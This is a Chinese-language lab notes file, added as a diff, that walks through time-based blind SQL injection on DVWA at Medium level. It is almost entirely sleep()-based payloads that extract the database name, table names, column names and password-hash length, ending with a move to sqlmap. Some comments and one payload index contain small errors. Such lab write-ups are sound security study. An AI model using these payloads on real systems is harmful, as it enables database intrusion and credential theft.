@@ -1,0 +1,41 @@
+Dvwa盲注-时间盲注-Medium实操
+
+#源代码为数字型注入 user_id=%id;
+#先测试库名长度
+1 and if(length(database())=4,sleep(3),0)          页面三秒后回显正常，判断库名长度值为4
+#爆库名
+1 and if(ascii(substr((select database()),1,1))>=110,sleep(3),0)       页面瞬间回显正常，判断为假
+1 and if(ascii(substr((select database()),1,1))=100,sleep(3),0)          页面三秒后回显正常，判断库名第一个字母为"d"
+猜库名第2个字母
+1 and if(ascii(substr((select database()),2,1))=118,sleep(3),0)          页面三秒后回显正常，判断库名第一个字母为"v"
+猜库名第3个字母
+1 and if(ascii(substr((select database()),3,1))=119,sleep(3),0)  	  页面三秒后回显正常，判断库名第一个字母为"w"
+猜库名第4个字母
+1 and if(ascii(substr((select database()),4,1))=97,sleep(3),0)		  页面三秒后回显正常，判断库名第一个字母为"a"
+得出库名为'dvwa'
+
+#爆表名
+1 and if(ascii(substr((select table_name from infromation_schema.tables where table_schema='dvwa' limit 0,1),1,1))>=100,sleep(3),0)            这时候页面直接显示错误，检查没有拼写问题开始尝试寻找问题
+1 and if(ascii(substr((select table_name from infromation_schema.tables where table_schema=database() limit 0,1))>=100,sleep(3),0)            页面正常回显，发现问题出在'被转义处理 mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $id  源代码
+1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=0x64767761 limit 3,1),1,1))=117,sleep(3),0)           页面正常3秒后回显，判断第4行第一个表名字母为'u' 前面表名信息无关，跳过了写
+猜第4行表名第2个字母
+1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=0x64767761 limit 3,1),2,1))=115,sleep(3),0)            页面正常3秒后回显，判断第4行第二个表名字母为's'
+猜第4行表名第3个字母
+1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=0x64767761 limit 3,1),3,1))=101,sleep(3),0)            页面正常3秒后回显，判断第4行第三个表名字母为'e'
+猜第4行表名第4个字母
+1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=0x64767761 limit 3,1),4,1))=114,sleep(3),0)	    页面正常3秒后回显，判断第4行第四个表名字母为'r'
+猜第4行表名第5个字母
+1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=0x64767761 limit 3,1),5,1))=115,sleep(3),0)	   页面正常3秒后回显，判断第4行第五个表名字母为's'
+第6个为NULL，判断最终表面信息为'users'
+
+#爆列名
+1 and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 3,1),1,1))=117,sleep(3),0)   得出第4行列名第一个字母为"u"
+1 and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 3,1),2,1))=115,sleep(3),0)    得出第4行列名第二个字母为"s"
+1 and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 3,1),3,1))=101,sleep(3),0)   得出第4行列名第三个字母为"e"
+1 and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 3,1),2,1))=114,sleep(3),0)   得出第4行列名第四个字母为"r"
+得出第一重要列信息为"user"
+1 and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 4,1),1,1))=112,sleep(3),0)    得出第5行列名第一个字母为"p"
+依次得出第5行信息为"password"
+
+#猜密码
+1 and if(length((select password from users limit 0,1))=32,sleep(3),0)   因为是哈希MD5加密 手工太慢这里就开始尝试用SQLMAP验证了。
